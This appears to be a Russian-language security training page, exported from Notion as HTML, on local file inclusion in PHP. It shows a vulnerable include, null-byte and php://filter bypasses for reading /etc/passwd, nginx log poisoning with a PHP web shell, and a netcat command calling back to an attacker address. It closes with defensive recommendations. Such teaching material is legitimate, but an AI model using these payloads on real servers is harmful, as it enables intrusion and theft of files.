@@ -1,0 +1,1188 @@
+<html>
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<title>4. LFI, Path Traversal</title>
+	<style>
+		/* cspell:disable-file */
+		/* webkit printing magic: print all background colors */
+		html {
+			-webkit-print-color-adjust: exact;
+		}
+
+		* {
+			box-sizing: border-box;
+			-webkit-print-color-adjust: exact;
+		}
+
+		html,
+		body {
+			margin: 0;
+			padding: 0;
+		}
+
+		@media only screen {
+			body {
+				margin: 2em auto;
+				max-width: 900px;
+				color: rgb(55, 53, 47);
+			}
+		}
+
+		body {
+			line-height: 1.5;
+			/* white-space: pre-wrap; */
+		}
+
+		a,
+		a.visited {
+			color: inherit;
+			text-decoration: underline;
+		}
+
+		.pdf-relative-link-path {
+			font-size: 80%;
+			color: #444;
+		}
+
+		h1,
+		h2,
+		h3 {
+			letter-spacing: -0.01em;
+			line-height: 1.2;
+			font-weight: 600;
+			margin-bottom: 0;
+		}
+
+		.page-title {
+			font-size: 2.5rem;
+			font-weight: 700;
+			margin-top: 0;
+			margin-bottom: 0.75em;
+		}
+
+		h1 {
+			font-size: 1.875rem;
+			margin-top: 1.875rem;
+		}
+
+		h2 {
+			font-size: 1.5rem;
+			margin-top: 1.5rem;
+		}
+
+		h3 {
+			font-size: 1.25rem;
+			margin-top: 1.25rem;
+		}
+
+		.source {
+			border: 1px solid #ddd;
+			border-radius: 3px;
+			padding: 1.5em;
+			word-break: break-all;
+		}
+
+		.callout {
+			border-radius: 3px;
+			padding: 1rem;
+		}
+
+		figure {
+			margin: 1.25em 0;
+			page-break-inside: avoid;
+		}
+
+		figcaption {
+			opacity: 0.5;
+			font-size: 85%;
+			margin-top: 0.5em;
+		}
+
+		mark {
+			background-color: transparent;
+		}
+
+		.indented {
+			padding-left: 1.5em;
+		}
+
+		hr {
+			background: transparent;
+			display: block;
+			width: 100%;
+			height: 1px;
+			visibility: visible;
+			border: none;
+			border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+		}
+
+		img {
+			max-width: 100%;
+		}
+
+		@media only print {
+			img {
+				max-height: 100vh;
+				object-fit: contain;
+			}
+		}
+
+		@page {
+			margin: 1in;
+		}
+
+		.collection-content {
+			font-size: 0.875rem;
+		}
+
+		.column-list {
+			display: flex;
+			justify-content: space-between;
+		}
+
+		.column {
+			padding: 0 1em;
+		}
+
+		.column:first-child {
+			padding-left: 0;
+		}
+
+		.column:last-child {
+			padding-right: 0;
+		}
+
+		.table_of_contents-item {
+			display: block;
+			font-size: 0.875rem;
+			line-height: 1.3;
+			padding: 0.125rem;
+		}
+
+		.table_of_contents-indent-1 {
+			margin-left: 1.5rem;
+		}
+
+		.table_of_contents-indent-2 {
+			margin-left: 3rem;
+		}
+
+		.table_of_contents-indent-3 {
+			margin-left: 4.5rem;
+		}
+
+		.table_of_contents-link {
+			text-decoration: none;
+			opacity: 0.7;
+			border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+		}
+
+		table,
+		th,
+		td {
+			border: 1px solid rgba(55, 53, 47, 0.09);
+			border-collapse: collapse;
+		}
+
+		table {
+			border-left: none;
+			border-right: none;
+		}
+
+		th,
+		td {
+			font-weight: normal;
+			padding: 0.25em 0.5em;
+			line-height: 1.5;
+			min-height: 1.5em;
+			text-align: left;
+		}
+
+		th {
+			color: rgba(55, 53, 47, 0.6);
+		}
+
+		ol,
+		ul {
+			margin: 0;
+			margin-block-start: 0.6em;
+			margin-block-end: 0.6em;
+		}
+
+		li>ol:first-child,
+		li>ul:first-child {
+			margin-block-start: 0.6em;
+		}
+
+		ul>li {
+			list-style: disc;
+		}
+
+		ul.to-do-list {
+			padding-inline-start: 0;
+		}
+
+		ul.to-do-list>li {
+			list-style: none;
+		}
+
+		.to-do-children-checked {
+			text-decoration: line-through;
+			opacity: 0.375;
+		}
+
+		ul.toggle>li {
+			list-style: none;
+		}
+
+		ul {
+			padding-inline-start: 1.7em;
+		}
+
+		ul>li {
+			padding-left: 0.1em;
+		}
+
+		ol {
+			padding-inline-start: 1.6em;
+		}
+
+		ol>li {
+			padding-left: 0.2em;
+		}
+
+		.mono ol {
+			padding-inline-start: 2em;
+		}
+
+		.mono ol>li {
+			text-indent: -0.4em;
+		}
+
+		.toggle {
+			padding-inline-start: 0em;
+			list-style-type: none;
+		}
+
+		/* Indent toggle children */
+		.toggle>li>details {
+			padding-left: 1.7em;
+		}
+
+		.toggle>li>details>summary {
+			margin-left: -1.1em;
+		}
+
+		.selected-value {
+			display: inline-block;
+			padding: 0 0.5em;
+			background: rgba(206, 205, 202, 0.5);
+			border-radius: 3px;
+			margin-right: 0.5em;
+			margin-top: 0.3em;
+			margin-bottom: 0.3em;
+			white-space: nowrap;
+		}
+
+		.collection-title {
+			display: inline-block;
+			margin-right: 1em;
+		}
+
+		.page-description {
+			margin-bottom: 2em;
+		}
+
+		.simple-table {
+			margin-top: 1em;
+			font-size: 0.875rem;
+			empty-cells: show;
+		}
+
+		.simple-table td {
+			height: 29px;
+			min-width: 120px;
+		}
+
+		.simple-table th {
+			height: 29px;
+			min-width: 120px;
+		}
+
+		.simple-table-header-color {
+			background: rgb(247, 246, 243);
+			color: black;
+		}
+
+		.simple-table-header {
+			font-weight: 500;
+		}
+
+		time {
+			opacity: 0.5;
+		}
+
+		.icon {
+			display: inline-block;
+			max-width: 1.2em;
+			max-height: 1.2em;
+			text-decoration: none;
+			vertical-align: text-bottom;
+			margin-right: 0.5em;
+		}
+
+		img.icon {
+			border-radius: 3px;
+		}
+
+		.user-icon {
+			width: 1.5em;
+			height: 1.5em;
+			border-radius: 100%;
+			margin-right: 0.5rem;
+		}
+
+		.user-icon-inner {
+			font-size: 0.8em;
+		}
+
+		.text-icon {
+			border: 1px solid #000;
+			text-align: center;
+		}
+
+		.page-cover-image {
+			display: block;
+			object-fit: cover;
+			width: 100%;
+			max-height: 30vh;
+		}
+
+		.page-header-icon {
+			font-size: 3rem;
+			margin-bottom: 1rem;
+		}
+
+		.page-header-icon-with-cover {
+			margin-top: -0.72em;
+			margin-left: 0.07em;
+		}
+
+		.page-header-icon img {
+			border-radius: 3px;
+		}
+
+		.link-to-page {
+			margin: 1em 0;
+			padding: 0;
+			border: none;
+			font-weight: 500;
+		}
+
+		p>.user {
+			opacity: 0.5;
+		}
+
+		td>.user,
+		td>time {
+			white-space: nowrap;
+		}
+
+		input[type="checkbox"] {
+			transform: scale(1.5);
+			margin-right: 0.6em;
+			vertical-align: middle;
+		}
+
+		p {
+			margin-top: 0.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.image {
+			border: none;
+			margin: 1.5em 0;
+			padding: 0;
+			border-radius: 0;
+			text-align: center;
+		}
+
+		.code,
+		code {
+			background: rgba(135, 131, 120, 0.15);
+			border-radius: 3px;
+			padding: 0.2em 0.4em;
+			border-radius: 3px;
+			font-size: 85%;
+			tab-size: 2;
+		}
+
+		code {
+			color: #eb5757;
+		}
+
+		.code {
+			padding: 1.5em 1em;
+		}
+
+		.code-wrap {
+			white-space: pre-wrap;
+			word-break: break-all;
+		}
+
+		.code>code {
+			background: none;
+			padding: 0;
+			font-size: 100%;
+			color: inherit;
+		}
+
+		blockquote {
+			font-size: 1.25em;
+			margin: 1em 0;
+			padding-left: 1em;
+			border-left: 3px solid rgb(55, 53, 47);
+		}
+
+		.bookmark {
+			text-decoration: none;
+			max-height: 8em;
+			padding: 0;
+			display: flex;
+			width: 100%;
+			align-items: stretch;
+		}
+
+		.bookmark-title {
+			font-size: 0.85em;
+			overflow: hidden;
+			text-overflow: ellipsis;
+			height: 1.75em;
+			white-space: nowrap;
+		}
+
+		.bookmark-text {
+			display: flex;
+			flex-direction: column;
+		}
+
+		.bookmark-info {
+			flex: 4 1 180px;
+			padding: 12px 14px 14px;
+			display: flex;
+			flex-direction: column;
+			justify-content: space-between;
+		}
+
+		.bookmark-image {
+			width: 33%;
+			flex: 1 1 180px;
+			display: block;
+			position: relative;
+			object-fit: cover;
+			border-radius: 1px;
+		}
+
+		.bookmark-description {
+			color: rgba(55, 53, 47, 0.6);
+			font-size: 0.75em;
+			overflow: hidden;
+			max-height: 4.5em;
+			word-break: break-word;
+		}
+
+		.bookmark-href {
+			font-size: 0.75em;
+			margin-top: 0.25em;
+		}
+
+		.sans {
+			font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+		}
+
+		.code {
+			font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace;
+		}
+
+		.serif {
+			font-family: Lyon-Text, Georgia, ui-serif, serif;
+		}
+
+		.mono {
+			font-family: iawriter-mono, Nitti, Menlo, Courier, monospace;
+		}
+
+		.pdf .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR';
+		}
+
+		.pdf .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR';
+		}
+
+		.pdf .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR';
+		}
+
+		.pdf .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR';
+		}
+
+		.highlight-default {
+			color: rgba(55, 53, 47, 1);
+		}
+
+		.highlight-gray {
+			color: rgba(120, 119, 116, 1);
+			fill: rgba(120, 119, 116, 1);
+		}
+
+		.highlight-brown {
+			color: rgba(159, 107, 83, 1);
+			fill: rgba(159, 107, 83, 1);
+		}
+
+		.highlight-orange {
+			color: rgba(217, 115, 13, 1);
+			fill: rgba(217, 115, 13, 1);
+		}
+
+		.highlight-yellow {
+			color: rgba(203, 145, 47, 1);
+			fill: rgba(203, 145, 47, 1);
+		}
+
+		.highlight-teal {
+			color: rgba(68, 131, 97, 1);
+			fill: rgba(68, 131, 97, 1);
+		}
+
+		.highlight-blue {
+			color: rgba(51, 126, 169, 1);
+			fill: rgba(51, 126, 169, 1);
+		}
+
+		.highlight-purple {
+			color: rgba(144, 101, 176, 1);
+			fill: rgba(144, 101, 176, 1);
+		}
+
+		.highlight-pink {
+			color: rgba(193, 76, 138, 1);
+			fill: rgba(193, 76, 138, 1);
+		}
+
+		.highlight-red {
+			color: rgba(212, 76, 71, 1);
+			fill: rgba(212, 76, 71, 1);
+		}
+
+		.highlight-default_background {
+			color: rgba(55, 53, 47, 1);
+		}
+
+		.highlight-gray_background {
+			background: rgba(241, 241, 239, 1);
+		}
+
+		.highlight-brown_background {
+			background: rgba(244, 238, 238, 1);
+		}
+
+		.highlight-orange_background {
+			background: rgba(251, 236, 221, 1);
+		}
+
+		.highlight-yellow_background {
+			background: rgba(251, 243, 219, 1);
+		}
+
+		.highlight-teal_background {
+			background: rgba(237, 243, 236, 1);
+		}
+
+		.highlight-blue_background {
+			background: rgba(231, 243, 248, 1);
+		}
+
+		.highlight-purple_background {
+			background: rgba(244, 240, 247, 0.8);
+		}
+
+		.highlight-pink_background {
+			background: rgba(249, 238, 243, 0.8);
+		}
+
+		.highlight-red_background {
+			background: rgba(253, 235, 236, 1);
+		}
+
+		.block-color-default {
+			color: inherit;
+			fill: inherit;
+		}
+
+		.block-color-gray {
+			color: rgba(120, 119, 116, 1);
+			fill: rgba(120, 119, 116, 1);
+		}
+
+		.block-color-brown {
+			color: rgba(159, 107, 83, 1);
+			fill: rgba(159, 107, 83, 1);
+		}
+
+		.block-color-orange {
+			color: rgba(217, 115, 13, 1);
+			fill: rgba(217, 115, 13, 1);
+		}
+
+		.block-color-yellow {
+			color: rgba(203, 145, 47, 1);
+			fill: rgba(203, 145, 47, 1);
+		}
+
+		.block-color-teal {
+			color: rgba(68, 131, 97, 1);
+			fill: rgba(68, 131, 97, 1);
+		}
+
+		.block-color-blue {
+			color: rgba(51, 126, 169, 1);
+			fill: rgba(51, 126, 169, 1);
+		}
+
+		.block-color-purple {
+			color: rgba(144, 101, 176, 1);
+			fill: rgba(144, 101, 176, 1);
+		}
+
+		.block-color-pink {
+			color: rgba(193, 76, 138, 1);
+			fill: rgba(193, 76, 138, 1);
+		}
+
+		.block-color-red {
+			color: rgba(212, 76, 71, 1);
+			fill: rgba(212, 76, 71, 1);
+		}
+
+		.block-color-default_background {
+			color: inherit;
+			fill: inherit;
+		}
+
+		.block-color-gray_background {
+			background: rgba(241, 241, 239, 1);
+		}
+
+		.block-color-brown_background {
+			background: rgba(244, 238, 238, 1);
+		}
+
+		.block-color-orange_background {
+			background: rgba(251, 236, 221, 1);
+		}
+
+		.block-color-yellow_background {
+			background: rgba(251, 243, 219, 1);
+		}
+
+		.block-color-teal_background {
+			background: rgba(237, 243, 236, 1);
+		}
+
+		.block-color-blue_background {
+			background: rgba(231, 243, 248, 1);
+		}
+
+		.block-color-purple_background {
+			background: rgba(244, 240, 247, 0.8);
+		}
+
+		.block-color-pink_background {
+			background: rgba(249, 238, 243, 0.8);
+		}
+
+		.block-color-red_background {
+			background: rgba(253, 235, 236, 1);
+		}
+
+		.select-value-color-uiBlue {
+			background-color: rgba(35, 131, 226, .07);
+		}
+
+		.select-value-color-pink {
+			background-color: rgba(245, 224, 233, 1);
+		}
+
+		.select-value-color-purple {
+			background-color: rgba(232, 222, 238, 1);
+		}
+
+		.select-value-color-green {
+			background-color: rgba(219, 237, 219, 1);
+		}
+
+		.select-value-color-gray {
+			background-color: rgba(227, 226, 224, 1);
+		}
+
+		.select-value-color-transparentGray {
+			background-color: rgba(227, 226, 224, 0);
+		}
+
+		.select-value-color-translucentGray {
+			background-color: rgba(0, 0, 0, 0.06);
+		}
+
+		.select-value-color-orange {
+			background-color: rgba(250, 222, 201, 1);
+		}
+
+		.select-value-color-brown {
+			background-color: rgba(238, 224, 218, 1);
+		}
+
+		.select-value-color-red {
+			background-color: rgba(255, 226, 221, 1);
+		}
+
+		.select-value-color-yellow {
+			background-color: rgba(253, 236, 200, 1);
+		}
+
+		.select-value-color-blue {
+			background-color: rgba(211, 229, 239, 1);
+		}
+
+		.select-value-color-pageGlass {
+			background-color: undefined;
+		}
+
+		.select-value-color-washGlass {
+			background-color: undefined;
+		}
+
+		.checkbox {
+			display: inline-flex;
+			vertical-align: text-bottom;
+			width: 16;
+			height: 16;
+			background-size: 16px;
+			margin-left: 2px;
+			margin-right: 5px;
+		}
+
+		.checkbox-on {
+			background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+		}
+
+		.checkbox-off {
+			background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+		}
+	</style>
+</head>
+
+<body>
+	<article id="131aa64c-9d0a-81c1-bbdc-fc64a430abb5" class="page sans">
+		<header>
+			<div class="page-header-icon undefined"><img class="icon" src="https://www.notion.so/icons/book_gray.svg" />
+			</div>
+			<h1 class="page-title">4. LFI, Path Traversal</h1>
+			<p class="page-description"></p>
+		</header>
+		<div class="page-body">
+			<h1 id="131aa64c-9d0a-81e0-92b0-d5f9e953725a" class="">LFI, Path Traversal</h1>
+			<p id="131aa64c-9d0a-8148-b97b-d1a55d288da3" class=""><strong>Local File Inclusion (LFI)</strong> — это
+				возможность использования локальных файлов сервера. Уязвимость позволяет удаленному пользователю
+				получить доступ с помощью специально сформированного запроса к произвольным файлам на сервере, в том
+				числе потенциально содержащим конфиденциальную информацию.</p>
+			<p id="131aa64c-9d0a-810d-af22-f8eaa7587dd7" class="">Возникает подобная уязвимость в том случае, если при
+				реализации веб-приложения используются небезопасные функции, например, <code>include</code>, позволяющие
+				включать контент на страницу из локального файла. В нашем случае это выглядит следующим образом:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-81d4-b194-f6e8675078ae"
+				class="code"><code class="language-PHP">&lt;?php
+	$file = $_GET[&#x27;file&#x27;];
+	if(isset($file))
+	{
+		include(&quot;$file&quot;);
+	}
+	?&gt;
+&lt;b&gt; &lt;p align=&quot;center&quot;&gt;Пример веб-приложения, доступный в Интеренте.&lt;/p&gt;&lt;/b&gt;</code></pre>
+			<p id="131aa64c-9d0a-81dc-b36f-f3f80898be0f" class="">Благодаря
+				строчке <code>include(“$file”)</code><strong> </strong>в содержимое страницы будет включаться значение
+				GET-параметра <code>file</code>. Теперь, используя эту уязвимость, нам будут возвращаться локальные
+				файлы, которые мы укажем в параметре.</p>
+			<p id="131aa64c-9d0a-814b-8123-d42606ae02f0" class="">Статья носит информационный характер. Не нарушайте
+				законодательство.</p>
+			<h3 id="131aa64c-9d0a-8147-94dc-e7524dec81bb" class="">Обнаружение уязвимости</h3>
+			<p id="131aa64c-9d0a-81bc-9b5b-ea89cbc3a34d" class="">Как обнаружить уязвимость? Если указать в потенциально
+				уязвимом параметре включение какого-то локального файла, например, <strong>index </strong>с любым
+				расширением, и этот файл откроется, то однозначно можно утверждать, что параметр отвечает за подкачку
+				файла. Сделать это можно как вручную, так и с помощью различных автоматизированных инструментов,
+				например, сканером уязвимостей <strong>Wapiti</strong>, или специализированным инструментом
+				<strong>LFISuite</strong>, который разработан именно под поиск и эксплуатацию LFI-уязвимостей.</p>
+			<p id="131aa64c-9d0a-81fb-a3fe-ea3272ac4ada" class="">Какие здесь могут быть подводные камни? Например,
+				наличие фильтрации, которая будет подставлять в окончание строки расширение файла, например,
+				<strong>.php</strong>. Таким образом, при попытке включения в страницу файла <strong>/etc/passwd
+				</strong>мы получим в адресной строке <strong>file=/etc/passwd.php</strong>, а содержимое этого файла не
+				будет отображаться на странице, так как файла не существует. Но такой фильтр можно обойти с помощью так
+				называемого нулевого байта, который будет «отсекать» все, что будет идти после него. Дело в том, что вся
+				адресная строка при передаче HTTP-запроса кодируется в URL-encode, и в этой кодировке нулевой байт
+				выглядит как <strong>%00</strong>. Таким образом, строчка <strong>/etc/passwd%00.php </strong>будет
+				преобразована в <strong>/etc/passwd</strong>. Однако стоит отметить, что данная проблема является
+				довольно известной и исправлена в версии <strong>PHP 5.3+</strong></p>
+			<p id="131aa64c-9d0a-81ca-a68c-d91975db45a1" class="">Другой вариант обхода фильтрации — использование
+				<strong>php filter</strong>. В параметре, отвечающем за включение файлов, пишем не просто путь до файла,
+				который мы хотим включить, а путь до файла с использованием этой функции. Теперь запрос, который мы
+				будем отправлять, имеет вид:</p>
+			<p id="131aa64c-9d0a-811c-8734-e7c407c3b675" class="">
+				<code>http://site.test.lan/index2.php?file=php://filter/convert.base64-encode/resource=/etc/passwd</code>
+			</p>
+			<p id="131aa64c-9d0a-8123-a896-d76bde4346e6" class="">И теперь на странице браузера мы увидим не содержимое
+				файла, а его исходник в кодировке <strong>base64</strong>, который можно декодировать.</p>
+			<p id="131aa64c-9d0a-8191-9ac2-d268203e62d5" class="">С основными моментами уязвимости LFI разобрались, и
+				теперь понимаем, что при ее эксплуатации можно прочитать локальный файл на удаленном сервере. Но у LFI
+				есть интересная особенность, позволяющая не просто прочитать локальные файлы, а скомпрометировать
+				сервер.</p>
+			<h3 id="131aa64c-9d0a-817f-88b3-ea146a98aa29" class="">Отравление журнала веб-сервера</h3>
+			<p id="131aa64c-9d0a-81fd-a442-d6616b5b1b7d" class="">Думаю, стоит сразу оговориться, что уязвимость не
+				новая, но тем не менее она до сих встречается и может представлять серьезную угрозу для безопасности
+				веб-сервера. При взаимодействии с веб-приложением любой наш запрос записывается в журналы веб-сервера,
+				как правило, это файлы <strong>/var/log/nginx/access.log </strong>или <strong>/var/log/nginx/error.log
+				</strong>если, например, используется веб-сервер <strong>Nginx</strong>, но названия конечных файлов,
+				разумеется, могут отличаться.</p>
+			<p id="131aa64c-9d0a-81e0-91e5-c107f7a17e90" class="">Теперь, составив специальный запрос, мы создадим
+				веб-шелл на сервере, записав его в <strong>access.log</strong>. Для отправки запроса будем использовать
+				инструмент Burp Suite, позволяющий в режиме реального времени перехватывать и редактировать запросы.</p>
+			<figure id="131aa64c-9d0a-8187-a602-c67effe641cb" class="image"><a
+					href="4 LFI, Path Traversal/Untitled.png"><img
+						style="width:768px"
+						src="4 LFI, Path Traversal/Untitled.png" /></a>
+			</figure>
+			<p id="131aa64c-9d0a-8102-84cd-c190e0081a53" class="">Наш веб-шелл <strong>&lt;?php system($_GET[cmd]);
+					?&gt; </strong>записан в журнале веб-сервера и готов к использованию.</p>
+			<p id="131aa64c-9d0a-8177-ab27-f20a9142741c" class="">Почему использовался именно параметр
+				<strong>User-Agent</strong>? Как уже говорилось ранее, адресная строка кодирует информацию с помощью
+				URL-encode, поэтому для передачи php-кода нужно использовать заголовки, а так как в <strong>access.log
+				</strong>точно пишется User-Agent, то и используем его. Обратившись к нашему веб-шеллу, получаем
+				возможность выполнять различные команды через параметр <strong>cmd</strong>:</p>
+			<p id="131aa64c-9d0a-812d-9eb9-c9d7e0e038e3" class="">
+				<code>http://site.test.lan/index2.php?file=/var/log/nginx/access.log&amp;cmd=ls /</code></p>
+			<p id="131aa64c-9d0a-8172-a2fe-e616ca96b4e3" class="">В чем отличие? LFI позволяет включать файл на сервере,
+				но необходимо указать полный путь до этого файла, то есть знать, где этот файл находится. Во втором
+				случае выполняется команда на самом сервере, а результат отображается в веб-приложении.</p>
+			<p id="131aa64c-9d0a-8108-a835-c0b9c6feaced" class="">Убедившись, что мы можем выполнять различные команды
+				на сервере, переходим к получению доступа на него. Для этого указываем в параметре <strong>cmd
+				</strong>команду запуска <strong>Netcat </strong>для связи с сервером атакующего, то есть с нами:</p>
+			<p id="131aa64c-9d0a-81c5-a15b-cac43eccab3b" class="">
+				<code>http://site.test.lan/index2.php?file=/var/log/nginx/access.log&amp;cmd=nc 192.168.0.135 4455</code>
+			</p>
+			<figure id="131aa64c-9d0a-81f2-967b-dd7c0a791fe6" class="image"><a
+					href="4 LFI, Path Traversal/Untitled%201.png"><img
+						style="width:480px"
+						src="4 LFI, Path Traversal/Untitled%201.png" /></a>
+			</figure>
+			<p id="131aa64c-9d0a-81b5-b101-c5475c9c66dd" class=""><strong>Рекомендации</strong></p>
+			<ul id="131aa64c-9d0a-8122-be3f-ff0413574f6e" class="bulleted-list">
+				<li style="list-style-type:disc">регулярно проверять безопасность веб-приложения с целью предотвращения
+					возникновения уязвимостей;</li>
+			</ul>
+			<ul id="131aa64c-9d0a-8109-bdaf-c866a22bb7cd" class="bulleted-list">
+				<li style="list-style-type:disc">добавить в журнал веб-сервера строчку <strong>&lt;?php exit(1);
+						?&gt;</strong>. Данный скрипт будет предотвращать любые попытки выполнения php-кода в этом
+					файле;</li>
+			</ul>
+			<ul id="131aa64c-9d0a-8137-a7ed-d2e64afd681a" class="bulleted-list">
+				<li style="list-style-type:disc">использовать средства защиты веб-приложений, например, WAF, который
+					будет блокировать вредоносный запрос, не позволяя его выполнить на веб-сервере.</li>
+			</ul>
+			<h2 id="131aa64c-9d0a-815d-8f2a-c6fbe147b755" class=""><strong>Альтернатива NULL-byte при LFI</strong></h2>
+			<p id="131aa64c-9d0a-81b8-8ab0-e893b07d3697" class="">Уязвимость основана на двух особенностях в функциях
+				PHP для взаимодействия с файловой системой:</p>
+			<ol type="1" id="131aa64c-9d0a-81dc-9f10-c1eed98a22dc" class="numbered-list" start="1">
+				<li><strong>Нормализация пути<br /><br /></strong>PHP обрабатывает строку, содержащую путь до файла или
+					папки, особым образом, в частности лишние символы “/” и “/.” удаляются.</li>
+			</ol>
+			<ol type="1" id="131aa64c-9d0a-812b-a2ca-e93ceae24b48" class="numbered-list" start="2">
+				<li><strong>Усечение пути<br /><br /></strong>PHP в зависимости от платформы имеет ограничение на длину
+					пути, определяемой константой MAX_PATH, в результате чего все символы, находящиеся за пределами
+					этого значения, отбрасываются.</li>
+			</ol>
+			<h3 id="131aa64c-9d0a-81c4-8a36-f5d22d6bc38f" class="">Нормализация пути</h3>
+			<p id="131aa64c-9d0a-81a7-80bd-daef8bcfc4c2" class="">Всем известно, что в PHP имеется большое количество
+				возможностей для быстрого и простого программирования. PHP способен совершать множество необходимых
+				действий самостоятельно, не обременяя разработчика лишними заботами. Такая направленность PHP однако
+				имеет и обратную сторону – возможно именно по причине излишней обработки путей возможна новая
+				уязвимость. Примеры нормализации пути:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
